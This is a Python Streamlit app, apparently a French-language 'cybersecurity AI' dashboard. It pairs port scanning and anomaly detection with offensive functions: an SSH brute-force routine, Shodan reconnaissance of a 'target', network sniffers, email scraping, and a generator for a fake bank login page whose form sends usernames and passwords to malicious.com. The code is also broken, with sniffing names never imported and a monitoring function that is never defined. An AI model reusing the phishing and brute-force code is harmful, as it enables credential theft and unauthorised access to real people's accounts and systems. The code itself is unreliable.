import scapy.all as scapy
import tensorflow as tf
import numpy as np
import nmap
import logging
import requests
import sqlite3
import streamlit as st
import pandas as pd
import plotly.express as px
import joblib
from datetime import datetime
from sklearn.ensemble import IsolationForest
from collections import deque
import threading
import paramiko
import re
import time
import shodan

# Configuration du logging
logging.basicConfig(filename='cybersecurity_logs.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Initialisation de la base de données SQLite
def init_db():
    conn = sqlite3.connect("cybersecurity.db")
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        ip TEXT,
                        port INTEGER,
                        state TEXT,
                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        source TEXT,
                        message TEXT,
                        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

# Enregistrer un log
def save_log(source, message):
    conn = sqlite3.connect("cybersecurity.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO logs (source, message) VALUES (?, ?)", (source, message))
    conn.commit()
    conn.close()
    logging.info(f"LOG [{source}]: {message}")

# Scan de ports avec enregistrement des vulnérabilités et détection CVE
def ethical_hacking_scan(target_ip):
    scanner = nmap.PortScanner()
    scanner.scan(target_ip, arguments='-sS -T4')
    logging.info(f'Scan éthique lancé sur {target_ip}')
    results = []
    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]["state"]
                results.append((target_ip, port, state))
                save_vulnerability(target_ip, port, state)
                check_cve(target_ip, port)  # Vérification des vulnérabilités CVE
    return results

# Vérification des CVE pour chaque port
def check_cve(target_ip, port):
    # Exemple d'API pour vérifier les CVE (à remplacer par une vraie API)
    cve_api_url = f"https://cve.circl.lu/api/cve/{target_ip}/{port}"
    response = requests.get(cve_api_url)
    if response.status_code == 200:
        cve_data = response.json()
        if cve_data.get('CVE'):
            save_log('CVE Scanner', f"Vulnérabilité trouvée sur {target_ip} Port {port}: {cve_data['CVE']}")
        else:
            save_log('CVE Scanner', f"Aucune vulnérabilité trouvée pour {target_ip} Port {port}")

# Détection des menaces en temps réel via Machine Learning
class ThreatDetection:
    def __init__(self):
        self.model = IsolationForest(contamination=0.1)
        self.data_queue = deque(maxlen=100)

    def update_model(self, new_data):
        self.data_queue.append(new_data)
        if len(self.data_queue) > 10:
            X_train = np.array(self.data_queue)
            self.model.fit(X_train)

    def detect_anomaly(self, log_entry):
        result = self.model.predict([log_entry])
        return result[0] == -1

detector = ThreatDetection()

# Surveillance du réseau
def sniff_network():
    print("Sniffing network...")
    def packet_callback(packet):
        if packet.haslayer(TCP):
            if packet[TCP].dport == 80:
                print(f"HTTP traffic detected: {packet.summary()}")
        elif packet.haslayer(IP):
            print(f"IP packet detected: {packet.summary()}")
    sniff(prn=packet_callback, store=0)

# Intégration de Shodan pour espionner la cible
def shodan_scan(target_ip):
    SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'
    api = shodan.Shodan(SHODAN_API_KEY)
    try:
        results = api.search(target_ip)
        for result in results['matches']:
            save_log("Shodan", f"Information trouvée sur {target_ip}: {result['data']}")
    except shodan.APIError as e:
        save_log("Shodan", f"Erreur Shodan: {e}")

# Brute-force SSH
def ssh_brute_force(target_ip, ssh_user, ssh_pass):
    print(f"Starting brute-force attack on SSH for {target_ip}...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(target_ip, username=ssh_user, password=ssh_pass)
        save_log('SSH Brute Force', f"SSH Brute Force Successful on {target_ip}")
    except paramiko.AuthenticationException:
        save_log('SSH Brute Force', f"Brute force failed on {target_ip}")
    finally:
        ssh.close()

# Sniffer réseau actif
def active_sniffer():
    print("Sniffing network actively...")
    while True:
        packet = sniff(count=1)
        if packet:
            print(f"Captured packet: {packet.summary()}")
            time.sleep(5)

# Création automatique de pages de phishing
def create_phishing_page():
    print("Creating phishing page...")
    phishing_html = '''
    <html>
        <body>
            <h1>Login to your bank account</h1>
            <form action="https://malicious.com/login" method="POST">
                Username: <input type="text" name="username"><br>
                Password: <input type="password" name="password"><br>
                <input type="submit" value="Login">
            </form>
        </body>
    </html>
    '''
    with open('phishing_page.html', 'w') as f:
        f.write(phishing_html)
    print("Phishing page created successfully!")

# Scraping des emails publics
def scrape_emails(target_url):
    print(f"Scraping emails from {target_url}...")
    response = requests.get(f"https://{target_url}")
    if response.status_code == 200:
        emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response.text))
        print(f"Emails found: {emails}")
        save_log("Email Scraper", f"Emails found on {target_url}: {emails}")
    else:
        print(f"Failed to scrape emails from {target_url}")

# Tableau de bord interactif avec Streamlit
st.title("🔍 CyberSecurity AI - Surveillance & Détection en Temps Réel")

# Surveillance en temps réel
st.header("📡 Surveillance en Temps Réel")
if st.button("Activer la surveillance"):
    monitoring_thread = threading.Thread(target=real_time_monitoring, daemon=True)
    monitoring_thread.start()
    st.success("Surveillance activée!")

# Scan de Ports
st.header("📌 Scan de Ports")
target_ip = st.text_input("Entrez l'IP cible", "192.168.1.100")
if st.button("Lancer le scan"):
    results = ethical_hacking_scan(target_ip)
    st.write("### Résultats du scan:")
    for res in results:
        st.write(f"🔴 {res[0]} - Port {res[1]} : {res[2]}")

# Affichage des logs
st.header("📝 Analyse des Logs")
if st.button("Charger les logs"):
    conn = sqlite3.connect("cybersecurity.db")
    cursor = conn.cursor()
    cursor.execute("SELECT source, message, timestamp FROM logs")
    data = cursor.fetchall()
    conn.close()
    if data:
        df = pd.DataFrame(data, columns=["Source", "Message", "Date"])
        st.write(df)
    else:
        st.write("Aucun log enregistré.")

# Initialisation de la base de données
init_db()
st.success("✅ Modules avancés ajoutés : détection des menaces, analyse des logs, automatisation des scans et surveillance en temps réel.")
